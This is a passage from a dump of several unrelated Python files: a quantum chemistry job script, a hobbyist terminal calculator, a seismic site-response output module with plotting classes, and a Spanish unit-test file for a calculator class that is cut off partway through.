('one_energy', 'minimize')}\nfor wfn_type in [\"apsetgd\", \"apg1rod\"]:\n    run_calc.make_wfn_dirs(f'h8*/*/{basis}/', f'oo-{wfn_type}', 10)\n    for dir_name, (objective, solver) in calc_type.items():\n        run_calc.write_wfn_py(f'h8*/*/{basis}/oo-{wfn_type}/{dir_name}', 8, wfn_type,\n                               optimize_orbs=True, pspace_exc=[1, 2, 3, 4, 5, 6, 7, 8], objective=objective, solver=solver,\n                               wfn_kwargs = None,\n                               wfn_noise=1e-4, memory='6gb',\n                               load_orbs=None, load_ham=None, load_wfn=None, old_fanpy=True)\n        run_calc.run_calcs(f'h8*/*/{basis}/oo-{wfn_type}/{dir_name}/', time='7d', memory='7gb', outfile='results.out')\n", "531": "#whistler's dumb calculator thing\n#started 2019/10/03, \"finished\" 2019/10/15, and actually finished 2020/08/13\n#because my power's out and there's nothing to do\nfrom calcStr import *\nimport sys, time, os\n#13 spaces in window\ncalcAns = 0\nslpTime = 0.50\ndef drawCalc():\n\tglobal calcAns2\n\tansLen = len(str(calcAns))\n\tif ansLen >= 11:\n\t\tansLen = 11\n\tansLenWrk = 13 - ansLen\n\tcalcAnsWrk = \" \" * ansLenWrk\n\tcalcAns2 = calcAnsWrk + str(calcAns)\n\tprint(calcTop + calcScr + f\"| |{calcAns2}| |\\n\" + calcScr + calcBlank + calcButnR0 + calcBlank + calcButnR1 + calcBlank + calcButnR2 + calcBlank + calcButnR3 + calcBlank + calcTop)\ndef prgClose():\n\tprint(calcClose)\n\ttime.sleep(slpTime)\n\tos.system('clear')\n\tsys.exit()\ndef outputHeader():\n\tos.system('clear')\n\tprint(valueOutput + empty)\ndef addHeader():\n\tos.system('clear')\n\tprint(valueA + empty)\ndef subHeader():\n\tos.system('clear')\n\tprint(valueS + empty)\ndef multHeader():\n\tos.system('clear')\n\tprint(valueM + empty)\ndef divHeader():\n\tos.system('clear')\n\tprint(valueD + empty)\ndef errHeader():\n\tos.system('clear')\n\tprint(valueE + empty)\n\nbrek = 0\nwhile brek == 0:\n\ttry:\n\t\tos.system('clear')\n\t\tprint(menuCalc2)\n\t\tsel = int(input(op))\n\t\tif sel >= 2:\n\t\t\tbrek += 1\n\t\t\tprgClose()\n\t\telif sel == 1 or sel == 0:\n\t\t\tbrek += 1\n\t\t\tos.system('clear')\n\t\t\ttime.sleep(slpTime)\n\t\t\tprint(menuCalc1)\n\t\t\tsel2 = int(input(op))\n\t\t\ttime.sleep(slpTime)\n\t\t\tif sel2 == 4: #divison\n\t\t\t\tdivHeader()\n\t\t\t\tvar0 = float(input(calcVal1))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tdivHeader()\n\t\t\t\tvar1 = float(input(calcVal2))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tplswork = var0/var1\n\t\t\t\tcalcAns = plswork\n\t\t\t\tos.system('clear')\n\t\t\t\toutputHeader()\n\t\t\t\tdrawCalc()\n\t\t\tif sel2 <= 1: #addition\n\t\t\t\taddHeader()\n\t\t\t\tvar0 = float(input(calcVal1))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\taddHeader()\n\t\t\t\tvar1 = float(input(calcVal2))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tplswork = var0 + var1\n\t\t\t\tcalcAns = plswork\n\t\t\t\tos.system('clear')\n\t\t\t\toutputHeader()\n\t\t\t\tdrawCalc()\n\t\t\tif sel2 == 2: #subtraction\n\t\t\t\tsubHeader()\n\t\t\t\tvar0 = float(input(calcVal1))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tsubHeader()\n\t\t\t\tvar1 = float(input(calcVal2))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tplswork = var0 - var1\n\t\t\t\tcalcAns = plswork\n\t\t\t\tos.system('clear')\n\t\t\t\toutputHeader()\n\t\t\t\tdrawCalc()\n\t\t\tif sel2 == 3: #mutiplication\n\t\t\t\tmultHeader()\n\t\t\t\tvar0 = float(input(calcVal1))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tmultHeader()\n\t\t\t\tvar1 = float(input(calcVal2))\n\t\t\t\ttime.sleep(slpTime)\n\t\t\t\tplswork = var0 * var1\n\t\t\t\tcalcAns = plswork\n\t\t\t\tos.system('clear')\n\t\t\t\toutputHeader()\n\t\t\t\tdrawCalc()\n\t\t\tif sel2 >= 5: #what the fuck did you do\n\t\t\t\terrHeader()\n\t\t\t\tprint(error2)\n\texcept ValueError:\n\t\terrHeader()\n\t\tprint(error2)\n\texcept KeyboardInterrupt:\n\t\tprgClose()\n\texcept ZeroDivisionError:\n\t\terrHeader()\n\t\tprint(divZeroError)\nif calcAns >= 1:\n\tansLen = len(str(calcAns))\n\tansLenWrk = 13 - ansLen\n\tcalcAnsWrk = \" \" * ansLenWrk\n\tcalcAns2 = calcAnsWrk + str(calcAns)\n", "532": "# The MIT License (MIT)\n#\n# Copyright (c) 2016-2021 Albert Kottke\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\nimport collections\n\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport scipy.integrate\nfrom matplotlib.colors import LogNorm\nfrom matplotlib.colors import TwoSlopeNorm\nfrom scipy.interpolate import interp1d\n\ntry:\n    import pandas as pd\nexcept ImportError:\n    pd = None\n\nimport pykooh\n\nfrom .motion import TimeSeriesMotion, WaveField, GRAVITY\n\n\ndef plot_amplification_evolv(\n    calc,\n    metric=\"accel_tf\",\n    depths=None,\n    freqs=None,\n    normalized=False,\n    wave_field_out=\"within\",\n    diverging_cmap=True,\n    include_vs_profile=False,\n    ax=None,\n    **kwds,\n):\n    # Default plotting kwds. Combine both set of plot keywords and prefer the provided\n    kwds = {\n        \"cmap\": \"RdBu\" if diverging_cmap else \"magma_r\",\n        \"shading\": \"gouraud\",\n        \"norm\": TwoSlopeNorm(vmin=0, vcenter=1) if diverging_cmap else LogNorm(),\n    } | kwds\n\n    if freqs is None:\n        freqs = np.logspace(-1, 2, num=301)\n\n    osc_damping = 0.05 if \"osc_damping\" not in kwds else kwds[\"osc_damping\"]\n\n    ln_freqs = np.log(freqs)\n    ln_freqs_mot = np.log(calc.motion.freqs)\n\n    def get_amp(metric, depth):\n        loc_output = calc.profile.location(wave_field_out, depth=depth)\n        if metric == \"accel_tf\":\n            y = np.abs(calc.calc_accel_tf(calc.loc_input, loc_output))\n            # Interpolate the specific frequencies\n            y = np.interp(ln_freqs, ln_freqs_mot, y)\n        elif metric == \"site_amp\":\n            if get_amp.in_ars is None:\n                get_amp.in_ars = calc.motion.calc_osc_accels(freqs, osc_damping)\n\n            out_ars = calc.motion.calc_osc_accels(\n                freqs, osc_damping, calc.calc_accel_tf(calc.loc_input, loc_output)\n            )\n            y = out_ars / get_amp.in_ars\n        else:\n            raise NotImplementedError\n\n        return y\n\n    # Initialize static variable\n    get_amp.in_ars = None\n\n    if depths is None:\n        depths = np.linspace(0, calc.profile[-1].depth)\n\n    if ax is None:\n        fig, ax = plt.subplots()\n\n    amps = np.array([get_amp(metric, d) for d in depths])\n    if normalized:\n        amps /= amps[-1, :]\n\n    cf = ax.pcolormesh(freqs, depths, amps, **kwds)\n\n    cb = plt.colorbar(cf, ax=ax)\n    cb.set_label(\"|TF|\" if metric == \"accel_tf\" else \"Site Ampl.\")\n\n    ax.set(\n        xlabel=\"Frequency (Hz)\",\n        xscale=\"log\",\n        ylabel=\"Depth (m)\",\n        yscale=\"linear\",\n        ylim=(depths[0], 0),\n    )\n\n    return ax\n\n\nclass OutputCollection(collections.abc.Collection):\n    def __init__(self, outputs):\n        super().__init__()\n        self.outputs = outputs\n\n    def __iter__(self):\n        return iter(self.outputs)\n\n    def __contains__(self, value):\n        return value in self.outputs\n\n    def __len__(self):\n        return len(self.outputs)\n\n    def __getitem__(self, key):\n        return self.outputs[key]\n\n    def __call__(self, calc, name=None):\n        # Save results\n        for o in self:\n            o(calc, name=name)\n\n    def reset(self):\n        for o in self:\n            o.reset()\n\n\ndef append_arrays(many, single):\n    \"\"\"Append an array to another padding with NaNs for constant length.\n\n    Parameters\n    ----------\n    many : array_like of rank (j, k)\n        values appended to a copy of this array. This may be a 1-D or 2-D\n        array.\n    single : array_like of rank l\n        values to append. This should be a 1-D array.\n\n    Returns\n    -------\n    append : :class:`numpy.ndarray`\n        2-D array with rank (j + 1, max(k, l)) with missing values padded\n        with :class:`numpy.nan`\n    \"\"\"\n    assert np.ndim(single) == 1\n\n    # Check if the values need to be padded to for equal length\n    diff = single.shape[0] - many.shape[0]\n    if diff < 0:\n        single = np.pad(single, (0, -diff), \"constant\", constant_values=np.nan)\n    elif diff > 0:\n        # Need different padding based on if many is 1d or 2d.\n        padding = ((0, diff), (0, 0)) if len(many.shape) > 1 else (0, diff)\n        many = np.pad(many, padding, \"constant\", constant_values=np.nan)\n    else:\n        # No padding needed\n        pass\n    return np.c_[many, single]\n\n\nclass Output(object):\n    _const_ref = False\n\n    xscale = \"log\"\n    yscale = \"log\"\n    drawstyle = \"default\"\n\n    def __init__(self, refs=None):\n        self._refs = np.asarray([] if refs is None else refs)\n        self._values = None\n        self._names = []\n\n    def __call__(self, calc, name=None):\n        if name is None:\n            if self.values is None:\n                i = 1\n            elif len(self.values.shape) == 1:\n                i = 2\n            else:\n                i = self.values.shape[1] + 1\n            name = \"r%d\" % i\n        self._names.append(name)\n\n    @property\n    def refs(self):\n        return self._refs\n\n    @property\n    def values(self):\n        return self._values\n\n    @property\n    def names(self):\n        return self._names\n\n    def reset(self):\n        self._values = None\n        self._names = []\n        if not self._const_ref:\n            self._refs = np.array([])\n\n    def iter_results(self):\n        shared_ref = len(self.refs.shape) == 1\n        for i, name in enumerate(self.names):\n            refs = self.refs if shared_ref else self.refs[:, i]\n            values = self.values if len(self.values.shape) == 1 else self.values[:, i]\n            yield name, refs, values\n\n    def _add_refs(self, refs):\n        refs = np.asarray(refs)\n        if len(self._refs) == 0:\n            self._refs = np.array(refs)\n        else:\n            self._refs = append_arrays(self._refs, refs)\n\n    def _add_values(self, values):\n        values = np.asarray(values)\n        if self._values is None:\n            self._values = values\n        else:\n            self._values = append_arrays(self._values, values)\n\n    def calc_stats(self, as_dataframe=False):\n        ln_values = np.log(self.values)\n        median = np.exp(np.nanmean(ln_values, axis=1))\n        ln_std = np.nanstd(ln_values, axis=1)\n\n        stats = {\"ref\": self.refs, \"median\": median, \"ln_std\": ln_std}\n        if as_dataframe and pd:\n            stats = pd.DataFrame(stats).set_index(\"ref\")\n            stats.index.name = self.ref_name\n\n        return stats\n\n    def to_dataframe(self):\n        if not pd:\n            raise RuntimeError(\"Install `pandas` library.\")\n\n        if isinstance(self.names[0], tuple):\n            columns = pd.MultiIndex.from_tuples(self.names)\n        else:\n            columns = self.names\n\n        df = pd.DataFrame(self.values, index=self.refs, columns=columns)\n\n        return df\n\n    @staticmethod\n    def _get_xy(refs, values):\n        return refs, values\n\n    def plot(self, ax=None, style=\"indiv\"):\n        assert style in [\"stats\", \"indiv\"]\n\n        if ax is None:\n            fig, ax = plt.subplots()\n\n        if style == \"stats\" and len(self.values.shape) > 1 and self.values.shape[1] < 3:\n            raise RuntimeError(\"Unable to plot stats for less than 3 values.\")\n\n        if style == \"stats\":\n            kwds = {\"color\": \"C0\", \"alpha\": 0.6, \"lw\": 0.8, \"drawstyle\": self.drawstyle}\n        elif style == \"indiv\":\n            kwds = {\"lw\": 1.0, \"drawstyle\": self.drawstyle}\n        else:\n            raise NotImplementedError(\"Valid options are: stats, indiv.\")\n\n        # Add the data\n        x, y = self._get_xy(self.refs, self.values)\n        lines = ax.plot(x, y, **kwds)\n\n        if style == \"stats\":\n            lines[0].set_label(\"Realization\")\n        else:\n            for layer, name in zip(lines, self.names):\n                layer.set_label(name)\n\n        if style == \"stats\":\n            stats = self.calc_stats()\n\n            ax.plot(\n                *self._get_xy(stats[\"ref\"], stats[\"median\"]),\n                color=\"C1\",\n                lw=2,\n                label=\"Median\",\n            )\n\n        ax.set(\n            xlabel=self.xlabel,\n            xscale=self.xscale,\n            ylabel=self.ylabel,\n            yscale=self.yscale,\n        )\n\n        if len(lines) > 1:\n            ax.legend()\n\n        return ax\n\n\nclass OutputLocation(object):\n    def __init__(self, wave_field, depth=None, index=None):\n        self._depth = depth\n        self._index = index\n        if not isinstance(wave_field, WaveField):\n            wave_field = WaveField[wave_field]\n        self._wave_field = wave_field\n\n    @property\n    def depth(self):\n        return self._depth\n\n    @property\n    def index(self):\n        return self._index\n\n    @property\n    def wave_field(self):\n        return self._wave_field\n\n    def __call__(self, profile):\n        \"\"\"Lookup the location with the profile.\"\"\"\n        return profile.location(self.wave_field, depth=self.depth, index=self.index)\n\n\nclass LocationBasedOutput(Output):\n    def __init__(self, ref, location):\n        super().__init__(ref)\n        self._location = location\n\n    @property\n    def location(self):\n        return self._location\n\n    def __call__(self, calc, name=None):\n        raise NotImplementedError\n\n    def _get_location(self, calc):\n        \"\"\"Locate location within the profile.\"\"\"\n        return self._location(calc.profile)\n\n\nclass TimeSeriesOutput(LocationBasedOutput):\n    xlabel = \"Time (sec)\"\n    xscale = \"linear\"\n    ylabel = NotImplemented\n    yscale = \"linear\"\n\n    ref_name = \"time\"\n\n    def __init__(self, location):\n        super().__init__(None, location)\n\n    @property\n    def times(self):\n        return self.refs\n\n    def __call__(self, calc, name=None):\n        if not isinstance(calc.motion, TimeSeriesMotion):\n            raise NotImplementedError\n        Output.__call__(self, calc, name)\n        # Compute the response\n        loc = self._get_location(calc)\n        tf = self._get_trans_func(calc, loc)\n        values = calc.motion.calc_time_series(tf)\n        values = self._modify_values(calc, loc, values)\n        self._add_values(values)\n        # Add the reference\n        refs = calc.motion.time_step * np.arange(len(values))\n        self._add_refs(refs)\n\n    def _get_trans_func(self, calc, location):\n        raise NotImplementedError\n\n    def _modify_values(self, calc, location, values):\n        return values\n\n    def to_dataframe(self):\n        raise NotImplementedError\n\n\nclass AccelerationTSOutput(TimeSeriesOutput):\n    ylabel = \"Acceleration (g)\"\n\n    def _get_trans_func(self, calc, location):\n        return calc.calc_accel_tf(calc.loc_input, location)\n\n\nclass AriasIntensityTSOutput(AccelerationTSOutput):\n    ylabel = \"Arias Intensity (m/s)\"\n\n    def _modify_values(self, calc, location, values):\n        time_step = calc.motion.time_step\n        values = scipy.integrate.cumtrapz(values**2, dx=time_step)\n        values *= GRAVITY * np.pi / 2\n        return values\n\n\nclass StrainTSOutput(TimeSeriesOutput):\n    def __init__(self, location, in_percent=False):\n        super().__init__(location)\n        self._in_percent = in_percent\n        assert self.location.wave_field == WaveField.within\n\n    def _get_trans_func(self, calc, location):\n        return calc.calc_strain_tf(calc.loc_input, location)\n\n    def _modify_values(self, calc, location, values):\n        if self._in_percent:\n            # Convert to percent\n            values *= 100.0\n        return values\n\n    @property\n    def ylabel(self):\n        suffix = \"(%)\" if self._in_percent else \"(dec)\"\n        return \"Shear Strain \" + suffix\n\n\nclass StressTSOutput(TimeSeriesOutput):\n    def __init__(self, location, damped=False, normalized=False):\n        super().__init__(location)\n        self._damped = damped\n        self._normalized = normalized\n        assert self.location.wave_field == WaveField.within\n\n    @property\n    def damped(self):\n        return self._damped\n\n    @property\n    def ylabel(self):\n        if self._normalized:\n            ylabel = \"Stress Ratio (\u03c4/\u03c3`\u1d65)\"\n        else:\n            ylabel = \"Stress (\u03c4)\"\n\n        return ylabel\n\n    def _get_trans_func(self, calc, location):\n        tf = calc.calc_stress_tf(calc.loc_input, location, self.damped)\n\n        if self._normalized:\n            # Correct by effective stress at depth\n            tf /= location.stress_vert(effective=True)\n\n        return tf\n\n\nclass FourierAmplitudeSpectrumOutput(LocationBasedOutput):\n    _const_ref = True\n    xlabel = \"Frequency (Hz)\"\n    ylabel = \"Fourier Ampl. (cm/s)\"\n\n    ref_name = \"freq\"\n\n    def __init__(self, freqs, location, ko_bandwidth=30):\n        super().__init__(freqs, location)\n        self._ko_bandwidth = ko_bandwidth\n\n    @property\n    def freqs(self):\n        return self._refs\n\n    @property\n    def ko_bandwidth(self):\n        return self._ko_bandwidth\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        loc = self._get_location(calc)\n        tf = calc.calc_accel_tf(calc.loc_input, loc)\n\n        if self.ko_bandwidth:\n            smoothed = pykooh.smooth(\n                self.freqs,\n                calc.motion.freqs,\n                np.abs(tf * calc.motion.fourier_amps),\n                self.ko_bandwidth,\n            )\n\n        self._add_values(smoothed)\n\n\nclass ResponseSpectrumOutput(LocationBasedOutput):\n    _const_ref = True\n    xlabel = \"Frequency (Hz)\"\n\n    ref_name = \"freq\"\n\n    def __init__(self, freqs, location, osc_damping):\n        super().__init__(freqs, location)\n        self._osc_damping = osc_damping\n\n    @property\n    def freqs(self):\n        return self._refs\n\n    @property\n    def periods(self):\n        return 1.0 / np.asarray(self._refs)\n\n    @property\n    def osc_damping(self):\n        return self._osc_damping\n\n    @property\n    def ylabel(self):\n        return f\"{100 * self.osc_damping:g}%-Damped, Spec. Accel. (g)\"\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        loc = self._get_location(calc)\n        tf = calc.calc_accel_tf(calc.loc_input, loc)\n        ars = calc.motion.calc_osc_accels(self.freqs, self.osc_damping, tf)\n        self._add_values(ars)\n\n\nclass RatioBasedOutput(Output):\n    _const_ref = True\n\n    def __init__(self, refs, location_in, location_out):\n        super().__init__(refs)\n        self._location_in = location_in\n        self._location_out = location_out\n\n    @property\n    def location_in(self):\n        return self._location_in\n\n    @property\n    def location_out(self):\n        return self._location_out\n\n    def __call__(self, calc, name=None):\n        raise NotImplementedError\n\n    def _get_locations(self, calc):\n        \"\"\"Locate locations within the profile.\"\"\"\n        return (self._location_in(calc.profile), self._location_out(calc.profile))\n\n\nclass AccelTransferFunctionOutput(RatioBasedOutput):\n    xlabel = \"Frequency (Hz)\"\n    ylabel = \"Accel. Transfer Func.\"\n\n    ref_name = \"freq\"\n\n    def __init__(\n        self, refs, location_in, location_out, ko_bandwidth=None, absolute=True\n    ):\n        super().__init__(refs, location_in, location_out)\n        self._ko_bandwidth = ko_bandwidth\n        self._absolute = absolute\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Locate position within the profile\n        loc_in, loc_out = self._get_locations(calc)\n        # Compute the response\n        if self._absolute:\n            tf = np.abs(calc.calc_accel_tf(loc_in, loc_out))\n        else:\n            tf = calc.calc_accel_tf(loc_in, loc_out)\n\n        if self._ko_bandwidth is None:\n            tf = np.interp(self.freqs, calc.motion.freqs, tf)\n        else:\n            tf = pykooh.smooth(self.freqs, calc.motion.freqs, tf, self._ko_bandwidth)\n\n        self._add_values(tf)\n\n    @property\n    def freqs(self):\n        return self._refs\n\n\nclass ResponseSpectrumRatioOutput(RatioBasedOutput):\n    xlabel = \"Frequency (Hz)\"\n\n    ref_name = \"freq\"\n\n    def __init__(self, freqs, location_in, location_out, osc_damping):\n        super().__init__(freqs, location_in, location_out)\n        self._osc_damping = osc_damping\n\n    @property\n    def freqs(self):\n        return self._refs\n\n    @property\n    def periods(self):\n        return 1.0 / np.asarray(self._refs)\n\n    @property\n    def osc_damping(self):\n        return self._osc_damping\n\n    @property\n    def ylabel(self):\n        return f\"{100 * self.osc_damping:g}%-Damped, Resp. Spectral Ratio\"\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        loc_in, loc_out = self._get_locations(calc)\n        in_ars = calc.motion.calc_osc_accels(\n            self.freqs, self.osc_damping, calc.calc_accel_tf(calc.loc_input, loc_in)\n        )\n        out_ars = calc.motion.calc_osc_accels(\n            self.freqs, self.osc_damping, calc.calc_accel_tf(calc.loc_input, loc_out)\n        )\n        ratio = out_ars / in_ars\n        self._add_values(ratio)\n\n\nclass ProfileBasedOutput(Output):\n    ylabel = \"Depth (m)\"\n    yscale = \"linear\"\n    drawstyle = \"steps-post\"\n\n    ref_name = \"depth\"\n\n    def __init__(self):\n        super().__init__()\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        depths = np.r_[0, calc.profile.depth_mid[:-1]]\n        self._add_refs(depths)\n\n    def calc_stats(self, as_dataframe=False, ref=None):\n        if ref is None:\n            ref = np.linspace(0, np.nanmax(self.refs) * 1.05, num=512)\n\n        n = self.values.shape[1]\n        with np.errstate(divide=\"ignore\", invalid=\"ignore\"):\n            # Ignore zeros in the data\n            ln_values = np.array([self._ln_interp(i, ref) for i in range(n)]).T\n            median = np.exp(np.nanmean(ln_values, axis=1))\n            ln_std = np.nanstd(ln_values, axis=1)\n\n        stats = {\"ref\": ref, \"median\": median, \"ln_std\": ln_std}\n        if as_dataframe and pd:\n            stats = pd.DataFrame(stats).set_index(\"ref\")\n            stats.index.name = self.ref_name\n\n        return stats\n\n    @staticmethod\n    def _get_xy(refs, values):\n        return values, refs\n\n    def plot(self, ax=None, style=\"stats\"):\n        ax = Output.plot(self, ax, style)\n        ax.invert_yaxis()\n        return ax\n\n    def _ln_interp(self, i, ref):\n        \"\"\"Interpolate the values in log-y space.\"\"\"\n\n        _ref = self.refs[:, i]\n        # Only select points with valid entries\n        mask = np.isfinite(_ref)\n        _ref = _ref[mask]\n        _ln_values = np.log(self.values[mask, i])\n\n        if np.any(mask):\n            f = interp1d(\n                _ref,\n                _ln_values,\n                kind=\"next\",\n                fill_value=(_ln_values[0], _ln_values[-1]),\n                bounds_error=False,\n            )\n            _ln_interped = f(ref)\n        else:\n            nans = np.empty_like(ref)\n            nans[:] = np.nan\n            _ln_interped = np.array(nans)\n\n        return _ln_interped\n\n    def to_dataframe(self, ref=None):\n        if not pd:\n            raise RuntimeError(\"Install `pandas` library.\")\n\n        if ref is None:\n            ref = np.linspace(0, np.nanmax(self.refs))\n\n        if isinstance(self.names[0], tuple):\n            columns = pd.MultiIndex.from_tuples(self.names)\n        else:\n            columns = self.names\n\n        # Ignore zeros in the data\n        n = self.values.shape[1]\n        values = np.exp(np.array([self._ln_interp(i, ref) for i in range(n)])).T\n\n        df = pd.DataFrame(values, index=ref, columns=columns)\n\n        return df\n\n\nclass MaxStrainProfile(ProfileBasedOutput):\n    xlabel = \"Max. Strain (dec)\"\n\n    def __init__(self):\n        super().__init__()\n\n    def __call__(self, calc, name=None):\n        ProfileBasedOutput.__call__(self, calc, name)\n        values = [0] + [layer.strain_max for layer in calc.profile[:-1]]\n        self._add_values(values)\n\n\nclass DampingProfile(ProfileBasedOutput):\n    xlabel = \"Damping (dec)\"\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Add depth at top of layer\n        self._add_refs(calc.profile.depth)\n\n        values = [layer.damping for layer in calc.profile[:-1]]\n        # Bring the first mid-layer value to the surface\n        values.insert(0, values[0])\n        self._add_values(values)\n\n\nclass ShearModReducProfile(ProfileBasedOutput):\n    xlabel = \"G/Gmax\"\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Add depth at top of layer\n        self._add_refs(calc.profile.depth)\n\n        values = [layer.shear_mod_reduc for layer in calc.profile[:-1]]\n        # Bring the first mid-layer value to the surface\n        values.insert(0, values[0])\n        self._add_values(values)\n\n\nclass InitialVelProfile(ProfileBasedOutput):\n    xlabel = \"Initial Velocity (m/s)\"\n\n    def __init__(self):\n        super().__init__()\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Add depth at top of layer\n        self._add_refs(calc.profile.depth)\n\n        values = [layer.initial_shear_vel for layer in calc.profile[:-1]]\n        values.insert(0, values[0])\n        self._add_values(values)\n\n\nclass CompatVelProfile(ProfileBasedOutput):\n    xlabel = \"Strain-Compatible Velocity (m/s)\"\n\n    def __init__(self):\n        super().__init__()\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Add depth at top of layer\n        self._add_refs(calc.profile.depth)\n\n        values = [np.min(layer.shear_vel) for layer in calc.profile[:-1]]\n        values.insert(0, values[0])\n        self._add_values(values)\n\n\nclass CyclicStressRatioProfile(ProfileBasedOutput):\n    # From Idriss and Boulanger (2008, pg. 70):\n    # The 0.65 is a constant used to represent the reference stress\n    # level. While being somewhat arbitrary it was selected in the\n    # beginning of the development of liquefaction procedures in 1966\n    # and has been in use ever since.\n    _stress_level = 0.65\n\n    def __init__(self):\n        super().__init__()\n\n    def __call__(self, calc, name=None):\n        ProfileBasedOutput.__call__(self, calc, name)\n        values = [\n            layer.stress_shear_max / layer.stress_vert(layer.thickness / 2, True)\n            for layer in calc.profile[:-1]\n        ]\n        # Repeat the first value for the surface\n        values = self._stress_level * np.array([values[0]] + values)\n        self._add_values(values)\n\n\nclass MaxAccelProfile(ProfileBasedOutput):\n    xlabel = \"Max. Accel. (g)\"\n\n    def __call__(self, calc, name=None):\n        Output.__call__(self, calc, name)\n        # Add depth at top of layer\n        depths = calc.profile.depth\n        values = [self._calc_accel(calc, depth) for depth in depths]\n        self._add_refs(depths)\n        self._add_values(values)\n\n    def _calc_accel(self, calc, depth):\n        return calc.motion.calc_peak(\n            calc.calc_accel_tf(\n                calc.loc_input, calc.profile.location(\"within\", depth=depth)\n            )\n        )\n", "533": "import unittest\nfrom calculadora import Calculadora\n\n\nclass TestCalculadora(unittest.TestCase):\n\n    def setUp(self):\n        self.calc = Calculadora()\n\n    def test_sumar_dos_mas_dos(self):\n        result = self.calc.suma(2, 2)\n        self.assertEqual(\n            4, result, \"2 + 2 = 4 El resultado no fue lo esperado\")\n\n    def test_sumar_0_mas_1(self):\n        result = self.calc.suma(0, 1)\n        self.assertEqual(1, result)\n\n    def test_sumar_cinco_mas_veinte(self):\n        result = self.calc.suma(5, 20)\n        self.assertEqual(\n            25, result, \"5 + 20 = 25 El resultado no fue lo esperado\")\n\n    def test_solo_positivos(self):\n        result = self.calc.suma(4, -1)\n        self.assertEqual(\"Solo numeros positivos\", result,\n                         \"El resultado no fue lo esperado\")\n\n    def test_sumar_4punto5_mas_menos1(self):\n        result = self.calc.suma(4.5, -1)\n        self.assertEqual(\"Solo numeros enteros\", result)\n\n    def test_sumar_x_mas_5(self):\n        result = self.calc.suma('x', 5)\n        self.assertEqual(\"Solo numeros\", result)\n\n    def test_restar_cero_menos_0(self):\n        result = self.calc.resta(0, 0)\n        self.assertEqual(0, result)\n\n    def test_restar_0_menos_1(self):\n        result = self.calc.resta(0, 1)\n        self.assertEqual(-1, result)\n\n    def test_restar_15_menos_menos3(self):\n        result = self.calc.resta(15, -1)\n        self.assertEqual(\"Solo numeros positivos\", result)\n\n    def test_restar_4punto5_menos_menos1(self):\n        result = self.calc.resta(4.5, -1)\n        self.assertEqual(\"Solo numeros enteros\", result)\n\n    def test_restar_x_menos_menos1(self):\n        result = self.calc.resta('x', -1)\n        self.assertEqual(\"Solo numeros\", result)\n\n    def test_multiplicar_0_por_0(self):\n        result = self.calc.multiplica(0, 0)\n        self.assertEqual(0, result)\n\n    def test_multiplicar_0_por_1(self):\n        result = self.calc.multiplica(0, 1)\n        self.assertEqual(0, result)\n\n    def test_multiplicar_6_por_9(self):\n        result = self.calc.multiplica(6, 9)\n        self.assertEqual(54, result)\n\n    def test_multiplicar_10_por_menos3(self):\n        result = self.calc.multiplica(10, -3)\n        self.assertEqual(-30, result)\n\n    def test_multiplicar_menos10_por_menos3(self):\n        result = self.calc.multiplica(-10, -3)\n        self.assertEqual(30, result)\n\n    def test_multiplicar_4punto5_por_menos1(self):\n        result = self.calc.multiplica(4.5, -1)\n        self.assertEqual(\"Solo numeros enteros\", result)\n\n    def test_multiplicar_x_por_menos1(self):\n        result = self.calc.multiplica('x', -1)\n        self.assertEqual(\"Solo numeros\", result)\n\n    def test_dividir_0_entre_0(self):\n        result = self.calc.divide(0, 0)\n        self.assertEqual(\"Indefinido\", result)\n\n    def test_dividir_0_entre_1(self):\n        result = self.calc.divide(0, 1)\n        self.assertEqual(0, result)\n\n    def test_dividir_1_entre_0(self):\n        result = self.calc.divide(1, 0)\n        self.assertEqual(\"Indefinido\", result)\n\n    def test_dividir_4_entre_5(self):\n        result = self.calc.divide(4, 5)\n        self.assertEqual(0.8, result)\n\n    def test_dividir_10_entre_5(self):\n        result = self.calc.divide(10, 5)\n        self.assertEqual(2, result)\n\n    def test_dividir_menos30_entre_menos3(self):\n        result = self.calc.divide(-30, -3)\n        self.assertEqual(10, result)\n\n    def test_dividir_menos30_entre_3(self):\n        result = self.calc.divide(-30, 3)\n        self.assertEqual(-10, result)\n\n    def test_dividir_5punto5_entre_menos1(self):\n        result = self.calc.divide(5.5, -1)\n        self.assertEqual(\"Solo numeros enteros\", result)\n\n    def test_dividir_x_entre_menos1(self):\n        result = self.calc.divide('x', -3)\n        self.assertEqual(\"Solo numeros\", result)\n\n    def test_elevar_0_al_0(self):\n        result = self.calc.potencia(0, 0)\n        self.assertEqual(\"Indefinido\", result)\n\n    